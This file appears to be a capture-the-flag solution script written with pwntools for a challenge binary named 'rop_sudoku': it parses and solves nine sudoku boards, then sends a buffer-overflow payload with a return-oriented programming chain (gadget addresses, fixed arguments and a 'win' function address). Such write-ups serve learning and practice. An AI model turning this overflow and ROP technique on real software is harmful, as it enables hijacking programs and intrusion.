from pwn import *
import check

def Solve(n,a):
    find = EmptySpace(n)
    if not find:
        return True
    else:
        row, col = find
    for i in range(1,10):
        if(a == 0):
            if check.check1(n, i, (row, col)):
                n[row][col] = i
                if Solve(n,a):
                    return True
                n[row][col] = 0
        elif (a == 1):
            if check.check2(n, i, (row, col)):
                n[row][col] = i
                if Solve(n,a):
                    return True
                n[row][col] = 0
        else:
            if check.check3(n, i, (row, col)):
                n[row][col] = i
                if Solve(n,a):
                    return True
                n[row][col] = 0
    
    return False

def EmptySpace(n):
    for i in range(len(n)):
        for j in range(len(n[0])):
            if n[i][j] == 0:
                return (i, j)
    return None

# p = remote("localhost", 2021)
p = process('./rop_sudoku')



for i in range(7):
    p.recvline()

# p.interactive()
for i in range(9):
    p.recvuntil("sudoku")
    p.recvuntil("\n")
    p.recvuntil("\n")

    my_string = b''
    answer = ''
    koor = []
    huruf = ['A', 'B', 'C', 'D', 'E', 'F', 'G', 'H']


    # if(i == 4):
        # p.interactive()

    for j in range(11):
        my_string += p.recvline()
    my_board = (my_string.decode("utf-8")).split("\n")
    del my_board[-1]

    #buat ngapusin "|" sama "-"
    for row in range(len(my_board)-2):
        if row%3 == 0 and row != 0:
            del my_board[row]
        my_board[row] = my_board[row].replace(" ", "")
        my_board[row] = my_board[row].replace("|", "")
        my_board[row] = list(my_board[row])
        for col in range(len(my_board[row])):
            if my_board[row][col].isdigit():
                my_board[row][col] = int(my_board[row][col])
            for k in range(8):
                if my_board[row][col] == huruf[k]:
                    my_board[row][col] = 0
                    koor.append([huruf[k], row, col])

    if i < 3:
        Solve(my_board, 0)
    elif i < 6:
        Solve(my_board, 1)
    else:
        Solve(my_board, 2)
    
    koor.sort()

    for m in range(8):
        answer += str(my_board[koor[m][1]][koor[m][2]])


    p.sendlineafter("Answer = ", answer)

# p.recvline()

rdi = 0x401723
rsi = 0x401721
alamat_win = 0x0000000000401296
p1 = 0xbeefdeaddeadbeef
p2 = 0xdeadbeefbeefdead

payload = b'A'*16 + p64(rdi) + p64(p1) + p64(rsi) + p64(p2) + p64(0) + p64(alamat_win)
p.sendlineafter("bit!", payload)
p.interactive()
p.close()
